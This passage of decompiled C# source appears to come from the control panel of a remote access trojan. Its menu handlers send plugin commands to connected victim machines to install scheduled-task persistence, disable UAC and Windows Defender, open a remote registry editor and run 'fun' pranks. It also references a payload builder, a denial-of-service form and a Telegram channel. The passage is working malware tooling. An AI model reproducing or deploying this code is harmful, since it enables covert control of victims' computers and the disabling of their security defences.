						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600009F RID: 159 RVA: 0x0000986C File Offset: 0x00007A6C
		private void installSchtaskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "InstallSchtask:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00009A08 File Offset: 0x00007C08
		private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "DisableUAC:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, true));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00009BA4 File Offset: 0x00007DA4
		private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "DisableDefedner:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, true));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00009D40 File Offset: 0x00007F40
		private void ConnectTimeout_Tick(object sender, EventArgs e)
		{
			Clients[] allClients = this.GetAllClients();
			if (allClients.Length != 0)
			{
				foreach (Clients clients in allClients)
				{
					if (Methods.DiffSeconds(clients.LastPing, DateTime.Now) > 20.0)
					{
						clients.Disconnected();
					}
				}
			}
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x00009D90 File Offset: 0x00007F90
		private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Regedit.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + clients.ID] == null)
					{
						new FormRegistryEditor
						{
							Name = "remoteRegedit:" + clients.ID,
							Text = "remoteRegedit:" + clients.ID,
							ParentClient = clients,
							F = this
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x00009E90 File Offset: 0x00008090
		private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "normalinstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00009F68 File Offset: 0x00008168
		private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "normaluninstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x0000A040 File Offset: 0x00008240
		private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Fun.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormFun)Application.OpenForms["fun:" + clients.ID] == null)
					{
						new FormFun
						{
							Name = "fun:" + clients.ID,
							Text = "fun:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00002239 File Offset: 0x00000439
		private void bunifuGradientPanel3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x00002239 File Offset: 0x00000439
		private void createDate_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x00002239 File Offset: 0x00000439
		private void HelpToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000AA RID: 170 RVA: 0x0000A140 File Offset: 0x00008340
		private void toolStripMenuItem1_Click(object sender, EventArgs e)
		{
			using (Form2 form = new Form2())
			{
				form.ShowDialog();
			}
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00006B80 File Offset: 0x00004D80
		private void siticoneLabel2_Click(object sender, EventArgs e)
		{
			using (FormBuilder formBuilder = new FormBuilder())
			{
				formBuilder.ShowDialog();
			}
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00002239 File Offset: 0x00000439
		private void bunifuGradientPanel4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000AD RID: 173 RVA: 0x000081A4 File Offset: 0x000063A4
		private void siticoneLabel4_Click(object sender, EventArgs e)
		{
			using (FormBlockClients formBlockClients = new FormBlockClients())
			{
				formBlockClients.ShowDialog();
			}
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00008FA8 File Offset: 0x000071A8
		private void siticoneLabel3_Click(object sender, EventArgs e)
		{
			using (FormSetting formSetting = new FormSetting())
			{
				formSetting.ShowDialog();
			}
		}

		// Token: 0x060000AF RID: 175 RVA: 0x0000222C File Offset: 0x0000042C
		private void siticoneLabel5_Click(object sender, EventArgs e)
		{
			Process.Start("https://t.me/toxicnetarmy");
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x0000A140 File Offset: 0x00008340
		private void siticoneLabel6_Click(object sender, EventArgs e)
		{
			using (Form2 form = new Form2())
			{
				form.ShowDialog();
			}
		}

		// Token: 0x0400001F RID: 31
		private bool trans;

		// Token: 0x04000020 RID: 32
		public cGeoMain cGeoMain = new cGeoMain();

		// Token: 0x04000021 RID: 33
		public static List<AsyncTask> getTasks = new List<AsyncTask>();

		// Token: 0x04000022 RID: 34
		private ListViewColumnSorter lvwColumnSorter;

		// Token: 0x04000023 RID: 35
		private readonly FormDOS formDOS;
	}
}
